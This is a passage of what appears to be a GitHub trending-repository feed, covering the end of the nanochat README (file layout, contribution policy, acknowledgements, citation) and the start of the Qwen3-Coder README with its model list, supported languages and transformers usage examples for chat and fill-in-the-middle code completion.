‚îÇ   ‚îú‚îÄ‚îÄ __init__.py                 # empty
‚îÇ   ‚îú‚îÄ‚îÄ checkpoint_manager.py       # Save/Load model checkpoints
‚îÇ   ‚îú‚îÄ‚îÄ common.py                   # Misc small utilities, quality of life
‚îÇ   ‚îú‚îÄ‚îÄ core_eval.py                # Evaluates base model CORE score (DCLM paper)
‚îÇ   ‚îú‚îÄ‚îÄ dataloader.py               # Tokenizing Distributed Data Loader
‚îÇ   ‚îú‚îÄ‚îÄ dataset.py                  # Download/read utils for pretraining data
‚îÇ   ‚îú‚îÄ‚îÄ engine.py                   # Efficient model inference with KV Cache
‚îÇ   ‚îú‚îÄ‚îÄ execution.py                # Allows the LLM to execute Python code as tool
‚îÇ   ‚îú‚îÄ‚îÄ gpt.py                      # The GPT nn.Module Transformer
‚îÇ   ‚îú‚îÄ‚îÄ logo.svg
‚îÇ   ‚îú‚îÄ‚îÄ loss_eval.py                # Evaluate bits per byte (instead of loss)
‚îÇ   ‚îú‚îÄ‚îÄ optim.py                    # AdamW + Muon optimizer, 1GPU and distributed
‚îÇ   ‚îú‚îÄ‚îÄ report.py                   # Utilities for writing the nanochat Report
‚îÇ   ‚îú‚îÄ‚îÄ tokenizer.py                # BPE Tokenizer wrapper in style of GPT-4
‚îÇ   ‚îî‚îÄ‚îÄ ui.html                     # HTML/CSS/JS for nanochat frontend
‚îú‚îÄ‚îÄ pyproject.toml
‚îú‚îÄ‚îÄ runs
‚îÇ   ‚îú‚îÄ‚îÄ miniseries.sh               # Miniseries training script
‚îÇ   ‚îú‚îÄ‚îÄ runcpu.sh                   # Small example of how to run on CPU/MPS
‚îÇ   ‚îú‚îÄ‚îÄ scaling_laws.sh             # Scaling laws experiments
‚îÇ   ‚îî‚îÄ‚îÄ speedrun.sh                 # Train the ~$100 nanochat d20
‚îú‚îÄ‚îÄ scripts
‚îÇ   ‚îú‚îÄ‚îÄ base_eval.py                # Base model: CORE score, bits per byte, samples
‚îÇ   ‚îú‚îÄ‚îÄ base_train.py               # Base model: train
‚îÇ   ‚îú‚îÄ‚îÄ chat_cli.py                 # Chat model: talk to over CLI
‚îÇ   ‚îú‚îÄ‚îÄ chat_eval.py                # Chat model: eval tasks
‚îÇ   ‚îú‚îÄ‚îÄ chat_rl.py                  # Chat model: reinforcement learning
‚îÇ   ‚îú‚îÄ‚îÄ chat_sft.py                 # Chat model: train SFT
‚îÇ   ‚îú‚îÄ‚îÄ chat_web.py                 # Chat model: talk to over WebUI
‚îÇ   ‚îú‚îÄ‚îÄ tok_eval.py                 # Tokenizer: evaluate compression rate
‚îÇ   ‚îî‚îÄ‚îÄ tok_train.py                # Tokenizer: train it
‚îú‚îÄ‚îÄ tasks
‚îÇ   ‚îú‚îÄ‚îÄ arc.py                      # Multiple choice science questions
‚îÇ   ‚îú‚îÄ‚îÄ common.py                   # TaskMixture | TaskSequence
‚îÇ   ‚îú‚îÄ‚îÄ customjson.py               # Make Task from arbitrary jsonl convos
‚îÇ   ‚îú‚îÄ‚îÄ gsm8k.py                    # 8K Grade School Math questions
‚îÇ   ‚îú‚îÄ‚îÄ humaneval.py                # Misnomer; Simple Python coding task
‚îÇ   ‚îú‚îÄ‚îÄ mmlu.py                     # Multiple choice questions, broad topics
‚îÇ   ‚îú‚îÄ‚îÄ smoltalk.py                 # Conglomerate dataset of SmolTalk from HF
‚îÇ   ‚îî‚îÄ‚îÄ spellingbee.py              # Task teaching model to spell/count letters
‚îú‚îÄ‚îÄ tests
‚îÇ   ‚îî‚îÄ‚îÄ test_engine.py
‚îî‚îÄ‚îÄ uv.lock
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;The goal of nanochat is to improve the state of the art in micro models that are accessible to work with end to end on budgets of &amp;lt; $1000 dollars. Accessibility is about overall cost but also about cognitive complexity - nanochat is not an exhaustively configurable LLM "framework"; there are no giant configuration objects, model factories, or if-then-else monsters in the code base. It is a single, cohesive, minimal, readable, hackable, maximally-forkable "strong baseline" codebase designed to run start to end and produce a ChatGPT model you can talk to. Currently, the most interesting part personally is speeding up the latency to GPT-2 (i.e. getting a CORE score above 0.256525). Currently this takes ~3 hours, but by improving the pretraining stage we can improve this further.&lt;/p&gt; 
&lt;p&gt;Current AI policy: disclosure. When submitting a PR, please declare any parts that had substantial LLM contribution and that you have not written or that you do not fully understand.&lt;/p&gt; 
&lt;h2&gt;Acknowledgements&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;The name (nanochat) derives from my earlier project &lt;a href="https://github.com/karpathy/nanoGPT"&gt;nanoGPT&lt;/a&gt;, which only covered pretraining.&lt;/li&gt; 
 &lt;li&gt;nanochat is also inspired by &lt;a href="https://github.com/KellerJordan/modded-nanogpt"&gt;modded-nanoGPT&lt;/a&gt;, which gamified the nanoGPT repo with clear metrics and a leaderboard, and borrows a lot of its ideas and some implementation for pretraining.&lt;/li&gt; 
 &lt;li&gt;Thank you to &lt;a href="https://huggingface.co/"&gt;HuggingFace&lt;/a&gt; for fineweb and smoltalk.&lt;/li&gt; 
 &lt;li&gt;Thank you &lt;a href="https://lambda.ai/service/gpu-cloud"&gt;Lambda&lt;/a&gt; for the compute used in developing this project.&lt;/li&gt; 
 &lt;li&gt;Thank you to chief LLM whisperer üßô‚Äç‚ôÇÔ∏è Alec Radford for advice/guidance.&lt;/li&gt; 
 &lt;li&gt;Thank you to the repo czar Sofie &lt;a href="https://github.com/svlandeg"&gt;@svlandeg&lt;/a&gt; for help with managing issues, pull requests and discussions of nanochat.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Cite&lt;/h2&gt; 
&lt;p&gt;If you find nanochat helpful in your research cite simply as:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{nanochat,
  author = {Andrej Karpathy},
  title = {nanochat: The best ChatGPT that \$100 can buy},
  year = {2025},
  publisher = {GitHub},
  url = {https://github.com/karpathy/nanochat}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;MIT&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>QwenLM/Qwen3-Coder</title>
      <link>https://github.com/QwenLM/Qwen3-Coder</link>
      <description>&lt;p&gt;Qwen3-Coder is the code version of Qwen3, the large language model series developed by Qwen team.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a name="readme-top"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://qianwen-res.oss-cn-beijing.aliyuncs.com/Qwen3-Coder/qwen3_coder.png" width="400" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/swebench_pro.png" width="800" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; üíú &lt;a href="https://chat.qwen.ai/"&gt;&lt;b&gt;Qwen Chat&lt;/b&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp;ü§ó &lt;a href="https://huggingface.co/collections/Qwen/qwen3-coder-687fc861e53c939e52d52d10"&gt;Hugging Face&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp;ü§ñ &lt;a href="https://modelscope.cn/organization/qwen"&gt;ModelScope&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp; üìë &lt;a href="https://qwenlm.github.io/blog/qwen3-coder-next/"&gt;Blog&lt;/a&gt; &amp;nbsp;&amp;nbsp; ÔΩú &amp;nbsp;&amp;nbsp;üìñ &lt;a href="https://qwen.readthedocs.io/"&gt;Documentation&lt;/a&gt; &lt;br /&gt; üåç &lt;a href="https://huggingface.co/spaces/Qwen/Qwen3-Coder-WebDev"&gt;WebDev&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp;üí¨ &lt;a href="https://github.com/QwenLM/Qwen/raw/main/assets/wechat.png"&gt;WeChat (ÂæÆ‰ø°)&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp;ü´® &lt;a href="https://discord.gg/CV4E9rpNSD"&gt; Discord&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp; üìÑ &lt;a href="https://github.com/QwenLM/Qwen3-Coder/raw/main/qwen3_coder_next_tech_report.pdf"&gt;Arxiv&lt;/a&gt;&amp;nbsp;&amp;nbsp; | &amp;nbsp;&amp;nbsp; üëΩ &lt;a href="https://github.com/QwenLM/qwen-code"&gt;Qwen Code&lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;Visit our Hugging Face or ModelScope organization (click links above), search checkpoints with names starting with &lt;code&gt;Qwen3-Coder-&lt;/code&gt;, and you will find all you need! Enjoy!&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#introduction"&gt;Introduction&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#key-features"&gt;Key Features&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#basic-information"&gt;Basic Information&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#quick-start"&gt;Quick Start&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#-chat-with-qwen3-coder"&gt;üëâüèª Chat with Qwen3-Coder&lt;/a&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#fill-in-the-middle-with-qwen3-coder"&gt;Fill in the middle with Qwen3-Coder&lt;/a&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#use-cases"&gt;Use Cases&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#example-releasing-a-website"&gt;Example: Releasing a Website&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#example-desktop-tidy"&gt;Example: Desktop Tidy&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#example-zombies-vs-plants"&gt;Example: Zombies vs. Plants&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#example-sound-ascii-art"&gt;Example: Sound ASCII Art&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#example-vibe-checking"&gt;Example: Vibe Checking&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#example-parkour-game"&gt;Example: Parkour Game&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#star-history"&gt;Star History&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#citation"&gt;Citation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#contact-us"&gt;Contact Us&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h1&gt;Qwen3-Coder-Next: Pushing Small Hybrid Models on Agentic Coding&lt;/h1&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;We are announcing Qwen3-Coder, our most agentic code model to date. &lt;strong&gt;Qwen3-Coder&lt;/strong&gt; is available in multiple sizes, &lt;strong&gt;Qwen3-Coder-480B-A35B-Instruct&lt;/strong&gt;, &lt;strong&gt;Qwen3-Coder-30B-A3B-Instruct&lt;/strong&gt;, &lt;strong&gt;Qwen3-Coder-Next&lt;/strong&gt;, offering exceptional performance in both coding and agentic tasks.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Qwen3-Coder-Next&lt;/strong&gt;, an open-weight language model designed specifically for coding agents and local development. Built on top of &lt;strong&gt;Qwen3-Next-80B-A3B-Base&lt;/strong&gt;, which adopts a novel architecture with hybrid attention and MoE, Qwen3-Coder-Next has been agentically trained at scale on large-scale executable task synthesis, environment interaction, and reinforcement learning, obtaining strong coding and agentic capabilities with significantly lower inference costs.&lt;/p&gt; 
&lt;h3&gt;Key Features&lt;/h3&gt; 
&lt;p&gt;üíª &lt;strong&gt;Efficiency-Performance Tradeoff&lt;/strong&gt;: among open models on &lt;strong&gt;Agentic Coding&lt;/strong&gt;, &lt;strong&gt;Agentic Browser-Use&lt;/strong&gt;, and other foundational coding tasks, achieving results comparable to Claude Sonnet.&lt;/p&gt; 
&lt;p&gt;üõ† &lt;strong&gt;Scaling Agentic Coding&lt;/strong&gt;: supporting most platforms such as &lt;strong&gt;Qwen Code&lt;/strong&gt;, &lt;strong&gt;CLINE&lt;/strong&gt;, &lt;strong&gt;Claude Code&lt;/strong&gt;, featuring a specially designed function call format;&lt;/p&gt; 
&lt;p&gt;üìö &lt;strong&gt;Long-context Capabilities&lt;/strong&gt;: with native support for &lt;strong&gt;256K&lt;/strong&gt; tokens, extendable up to &lt;strong&gt;1M&lt;/strong&gt; tokens using Yarn, optimized for repository-scale understanding.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Basic Information&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;‚ú® Supporting long context understanding and generation with the context length of 256K tokens;&lt;/li&gt; 
 &lt;li&gt;‚ú® Supporting 358 coding languages;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to view all supported languages&lt;/summary&gt; ``` ['ABAP', 'ActionScript', 'Ada', 'Agda', 'Alloy', 'ApacheConf', 'AppleScript', 'Arc', 'Arduino', 'AsciiDoc', 'AspectJ', 'Assembly', 'Augeas', 'AutoHotkey', 'AutoIt', 'Awk', 'Batchfile', 'Befunge', 'Bison', 'BitBake', 'BlitzBasic', 'BlitzMax', 'Bluespec', 'Boo', 'Brainfuck', 'Brightscript', 'Bro', 'C', 'C#', 'C++', 'C2hs Haskell', 'CLIPS', 'CMake', 'COBOL', 'CSS', 'CSV', "Cap'n Proto", 'CartoCSS', 'Ceylon', 'Chapel', 'ChucK', 'Cirru', 'Clarion', 'Clean', 'Click', 'Clojure', 'CoffeeScript', 'ColdFusion', 'ColdFusion CFC', 'Common Lisp', 'Component Pascal', 'Coq', 'Creole', 'Crystal', 'Csound', 'Cucumber', 'Cuda', 'Cycript', 'Cython', 'D', 'DIGITAL Command Language', 'DM', 'DNS Zone', 'Darcs Patch', 'Dart', 'Diff', 'Dockerfile', 'Dogescript', 'Dylan', 'E', 'ECL', 'Eagle', 'Ecere Projects', 'Eiffel', 'Elixir', 'Elm', 'Emacs Lisp', 'EmberScript', 'Erlang', 'F#', 'FLUX', 'FORTRAN', 'Factor', 'Fancy', 'Fantom', 'Forth', 'FreeMarker', 'G-code', 'GAMS', 'GAP', 'GAS', 'GDScript', 'GLSL', 'Genshi', 'Gentoo Ebuild', 'Gentoo Eclass', 'Gettext Catalog', 'Glyph', 'Gnuplot', 'Go', 'Golo', 'Gosu', 'Grace', 'Gradle', 'Grammatical Framework', 'GraphQL', 'Graphviz (DOT)', 'Groff', 'Groovy', 'Groovy Server Pages', 'HCL', 'HLSL', 'HTML', 'HTML+Django', 'HTML+EEX', 'HTML+ERB', 'HTML+PHP', 'HTTP', 'Haml', 'Handlebars', 'Harbour', 'Haskell', 'Haxe', 'Hy', 'IDL', 'IGOR Pro', 'INI', 'IRC log', 'Idris', 'Inform 7', 'Inno Setup', 'Io', 'Ioke', 'Isabelle', 'J', 'JFlex', 'JSON', 'JSON5', 'JSONLD', 'JSONiq', 'JSX', 'Jade', 'Jasmin', 'Java', 'Java Server Pages', 'JavaScript', 'Julia', 'Jupyter Notebook', 'KRL', 'KiCad', 'Kit', 'Kotlin', 'LFE', 'LLVM', 'LOLCODE', 'LSL', 'LabVIEW', 'Lasso', 'Latte', 'Lean', 'Less', 'Lex', 'LilyPond', 'Linker Script', 'Liquid', 'Literate Agda', 'Literate CoffeeScript', 'Literate Haskell', 'LiveScript', 'Logos', 'Logtalk', 'LookML', 'Lua', 'M', 'M4', 'MAXScript', 'MTML', 'MUF', 'Makefile', 'Mako', 'Maple', 'Markdown', 'Mask', 'Mathematica', 'Matlab', 'Max', 'MediaWiki', 'Metal', 'MiniD', 'Mirah', 'Modelica', 'Module Management System', 'Monkey', 'MoonScript', 'Myghty', 'NSIS', 'NetLinx', 'NetLogo', 'Nginx', 'Nimrod', 'Ninja', 'Nit', 'Nix', 'Nu', 'NumPy', 'OCaml', 'ObjDump', 'Objective-C++', 'Objective-J', 'Octave', 'Omgrofl', 'Opa', 'Opal', 'OpenCL', 'OpenEdge ABL', 'OpenSCAD', 'Org', 'Ox', 'Oxygene', 'Oz', 'PAWN', 'PHP', 'POV-Ray SDL', 'Pan', 'Papyrus', 'Parrot', 'Parrot Assembly', 'Parrot Internal Representation', 'Pascal', 'Perl', 'Perl6', 'Pickle', 'PigLatin', 'Pike', 'Pod', 'PogoScript', 'Pony', 'PostScript', 'PowerShell', 'Processing', 'Prolog', 'Propeller Spin', 'Protocol Buffer', 'Public Key', 'Pure Data', 'PureBasic', 'PureScript', 'Python', 'Python traceback', 'QML', 'QMake', 'R', 'RAML', 'RDoc', 'REALbasic', 'RHTML', 'RMarkdown', 'Racket', 'Ragel in Ruby Host', 'Raw token data', 'Rebol', 'Red', 'Redcode', "Ren'Py", 'RenderScript', 'RobotFramework', 'Rouge', 'Ruby', 'Rust', 'SAS', 'SCSS', 'SMT', 'SPARQL', 'SQF', 'SQL', 'STON', 'SVG', 'Sage', 'SaltStack', 'Sass', 'Scala', 'Scaml', 'Scheme', 'Scilab', 'Self', 'Shell', 'ShellSession', 'Shen', 'Slash', 'Slim', 'Smali', 'Smalltalk', 'Smarty', 'Solidity', 'SourcePawn', 'Squirrel', 'Stan', 'Standard ML', 'Stata', 'Stylus', 'SuperCollider', 'Swift', 'SystemVerilog', 'TOML', 'TXL', 'Tcl', 'Tcsh', 'TeX', 'Tea', 'Text', 'Textile', 'Thrift', 'Turing', 'Turtle', 'Twig', 'TypeScript', 'Unified Parallel C', 'Unity3D Asset', 'Uno', 'UnrealScript', 'UrWeb', 'VCL', 'VHDL', 'Vala', 'Verilog', 'VimL', 'Visual Basic', 'Volt', 'Vue', 'Web Ontology Language', 'WebAssembly', 'WebIDL', 'X10', 'XC', 'XML', 'XPages', 'XProc', 'XQuery', 'XS', 'XSLT', 'Xojo', 'Xtend', 'YAML', 'YANG', 'Yacc', 'Zephir', 'Zig', 'Zimpl', 'desktop', 'eC', 'edn', 'fish', 'mupad', 'nesC', 'ooc', 'reStructuredText', 'wisp', 'xBase'] ``` 
&lt;/details&gt; 
&lt;ol start="3"&gt; 
 &lt;li&gt;‚ú® Retain strengths in math and general capabilities from base model.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!Important]&lt;/p&gt; 
 &lt;p&gt;Qwen3-Coder function calling relies on our new tool parser in both &lt;strong&gt;SGLang&lt;/strong&gt; and &lt;strong&gt;vLLM&lt;/strong&gt; &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-Next/blob/main/"&gt;here&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;We updated both the special tokens and their corresponding token ids, in order to maintain consistency with Qwen3. Please make sure to use the new tokenizer.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;model name&lt;/th&gt; 
   &lt;th&gt;type&lt;/th&gt; 
   &lt;th&gt;length&lt;/th&gt; 
   &lt;th&gt;Download&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-Next&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-Next"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-Next"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-Next-Base&lt;/td&gt; 
   &lt;td&gt;base&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-Next-Base"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-Next-Base"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-480B-A35B-Instruct&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-480B-A35B-Instruct"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-480B-A35B-Instruct"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-30B-A3B-Instruct&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-30B-A3B-Instruct"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-30B-A3B-Instruct"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-Next-FP8&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-Next-FP8"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-Next-FP8"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-Next-GGUF&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-Next-GGUF"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-Next-GGUF"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-480B-A35B-Instruct-FP8&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-480B-A35B-Instruct-FP8"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-480B-A35B-Instruct-FP8"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen3-Coder-30B-A3B-Instruct-FP8&lt;/td&gt; 
   &lt;td&gt;instruct&lt;/td&gt; 
   &lt;td&gt;256k&lt;/td&gt; 
   &lt;td&gt;ü§ó &lt;a href="https://huggingface.co/Qwen/Qwen3-Coder-30B-A3B-Instruct-FP8"&gt;Hugging Face&lt;/a&gt; ‚Ä¢ ü§ñ &lt;a href="https://modelscope.cn/models/Qwen/Qwen3-Coder-30B-A3B-Instruct-FP8"&gt;ModelScope&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;Detailed performance and introduction are shown in this &lt;a href="https://qwenlm.github.io/blog/qwen3-coder-next/"&gt;üìë blog&lt;/a&gt;.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Quick Start&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!Important] &lt;strong&gt;Qwen3-Coder&lt;/strong&gt; are instruct models for chatting;&lt;/p&gt; 
 &lt;p&gt;This model supports only non-thinking mode and does not generate &lt;code&gt;&amp;lt;think&amp;gt;&amp;lt;/think&amp;gt;&lt;/code&gt; blocks in its output. Meanwhile, specifying &lt;code&gt;enable_thinking=False&lt;/code&gt; is no longer required.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;üëâüèª Chat with Qwen3-Coder&lt;/h3&gt; 
&lt;p&gt;You can write several lines of code with &lt;code&gt;transformers&lt;/code&gt; to chat with Qwen3-Coder-Next. Essentially, we build the tokenizer and the model with the &lt;code&gt;from_pretrained&lt;/code&gt; method, and we use the generate method to perform chatting with the help of the chat template provided by the tokenizer. Below is an example of how to chat with &lt;strong&gt;Qwen3-Coder-Next&lt;/strong&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from transformers import AutoModelForCausalLM, AutoTokenizer

model_name = "Qwen/Qwen3-Coder-Next"

model = AutoModelForCausalLM.from_pretrained(
    model_name,
    torch_dtype="auto",
    device_map="auto"
)
tokenizer = AutoTokenizer.from_pretrained(model_name)

prompt = "write a quick sort algorithm."
messages = [
    {"role": "user", "content": prompt}
]
text = tokenizer.apply_chat_template(
    messages,
    tokenize=False,
    add_generation_prompt=True
)
model_inputs = tokenizer([text], return_tensors="pt").to(model.device)

generated_ids = model.generate(
    **model_inputs,
    max_new_tokens=65536
)
generated_ids = [
    output_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids)
]

response = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;apply_chat_template()&lt;/code&gt; function is used to convert the messages into a format that the model can understand. The &lt;code&gt;add_generation_prompt&lt;/code&gt; argument is used to add a generation prompt, which refers to &lt;code&gt;&amp;lt;|im_start|&amp;gt;assistant\n&lt;/code&gt; to the input. Notably, we apply the ChatML template for chat models following our previous practice. The &lt;code&gt;max_new_tokens&lt;/code&gt; argument is used to set the maximum length of the response. The &lt;code&gt;tokenizer.batch_decode()&lt;/code&gt; function is used to decode the response. In terms of the input, the above messages are an example to show how to format your dialog history and system prompt. You can use the other sizes of instruct models in the same way.&lt;/p&gt; 
&lt;h4&gt;Fill in the middle with Qwen3-Coder&lt;/h4&gt; 
&lt;p&gt;The code insertion task, also referred to as the "fill-in-the-middle" challenge, requires the insertion of code segments in a manner that bridges the gaps within a given code context. For an approach aligned with best practices, we recommend adhering to the formatting guidelines outlined in the paper "Efficient Training of Language Models to Fill in the Middle" [&lt;a href="https://arxiv.org/abs/2207.14255"&gt;arxiv&lt;/a&gt;].&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!Important] It should be noted that FIM is supported in every version of Qwen3-Coder. Qwen3-Coder-Next is shown here as an example.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;The prompt should be structured as follows:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;prompt = '&amp;lt;|fim_prefix|&amp;gt;' + prefix_code + '&amp;lt;|fim_suffix|&amp;gt;' + suffix_code + '&amp;lt;|fim_middle|&amp;gt;'
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Following the approach mentioned, an example would be structured in this manner:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from transformers import AutoTokenizer, AutoModelForCausalLM
# load model
device = "cuda" # the device to load the model onto

TOKENIZER = AutoTokenizer.from_pretrained("Qwen/Qwen3-Coder-Next")
MODEL = AutoModelForCausalLM.from_pretrained("Qwen/Qwen3-Coder-Next", device_map="auto").eval()


input_text = """&amp;lt;|fim_prefix|&amp;gt;def quicksort(arr):
    if len(arr) &amp;lt;= 1:
        return arr
    pivot = arr[len(arr) // 2]
    &amp;lt;|fim_suffix|&amp;gt;
    middle = [x for x in arr if x == pivot]
    right = [x for x in arr if x &amp;gt; pivot]
